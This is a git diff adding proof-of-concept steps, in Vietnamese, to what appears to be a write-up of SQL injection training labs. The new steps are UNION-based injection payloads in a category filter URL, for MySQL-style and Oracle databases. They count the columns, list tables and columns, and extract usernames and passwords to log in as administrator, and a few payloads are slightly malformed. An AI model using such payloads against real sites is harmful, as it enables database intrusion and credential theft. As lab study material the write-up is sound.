@@ -108,21 +108,27 @@ response không lỗi (2 cột NULL hợp lệ).
 
 1. Kiểm tra số cột
 
-/filter?category=Accessories'union all select NULL,NULL-- -
+/filter?category=Accessories'union all select null,null-- -
 
 <img width="1600" height="481" alt="image" src="https://github.com/user-attachments/assets/4a5f6763-cf8f-4bf1-8b3c-50ddb2aa045a" />
 
 response không lỗi (2 cột NULL hợp lệ).
 
-2. Liệt kê tên bảng (metadata)
+2. Liệt kê tên bảng 
+
+/filter?category=Accessories'union all select 'abc',table_name from information_schema.tables--
 
 <img width="1169" height="853" alt="image" src="https://github.com/user-attachments/assets/e847237b-11c6-4f1b-aacb-9b61237b7b58" />
 
 3. Liệt kê cột của bảng users_ibdtik
 
+/filter?category=Accessories'union all select 'abc', column_name from information_schema.columns where table_name 'users ibdtik'--
+
 <img width="1109" height="746" alt="image" src="https://github.com/user-attachments/assets/7f98ec77-8e9a-4b56-9b16-7f7b1d1b5284" />
 
 4. Liệt kê cột của 2 bảng username_yiszda và password_qrxtez
+
+/filter?category='union all select username_yiszda, password_qrxtez from users_ibdtik--
 
 <img width="1138" height="801" alt="image" src="https://github.com/user-attachments/assets/9ad8b17e-5a89-4902-bae3-73b9f55dc129" />
 
@@ -136,3 +142,32 @@ response không lỗi (2 cột NULL hợp lệ).
 
 Ứng dụng có chức năng đăng nhập và cơ sở dữ liệu trên Oracle chứa một bảng lưu trữ tên người dùng và mật khẩu. Cần xác định tên của bảng này và các cột chứa trong bảng, sau đó truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng và đăng nhập với tư cách administrator.
 
+- POC:
+
+1. Kiểm tra số cột
+
+/filter?category=Accessories'union all select null,null from dual-- -
+
+<img width="1694" height="658" alt="image" src="https://github.com/user-attachments/assets/c078548e-42e5-4b93-9d1a-a421212f3733" />
+
+2. Liệt kê tên bảng
+
+/filter?category=Accessories'union all select 'a',table_name from all_tables-- -
+
+<img width="1391" height="368" alt="image" src="https://github.com/user-attachments/assets/e061caa6-1127-45eb-9c55-f2c861ebaf6a" />
+
+3. Liệt kê cột của bảng USERS_HAXSQK
+
+/filter?category=Accessories'union all select 'a',column_name from all_tab_columns where table_name=USERS_HAXSQK-- -
+
+<img width="1418" height="599" alt="image" src="https://github.com/user-attachments/assets/73af8f4c-a777-469b-904c-2867fb88c00a" />
+
+4. Liệt kê cột của 2 bảng USERNAME_VAPQIJ và PASSWORD_ITOVBE
+
+/filter?category=Accessories'union all select USERNAME_VAPQIJ,PASSWORD_ITOVBE from USERS_HAXSQK-- -
+
+<img width="1416" height="647" alt="image" src="https://github.com/user-attachments/assets/53a50ba3-862b-462c-b4c3-d94a6626821d" />
+
+5. Đăng nhập vào tài khoản administrator
+
+<img width="981" height="417" alt="image" src="https://github.com/user-attachments/assets/31867ac1-a444-49ad-abd8-100fd739dec8" />
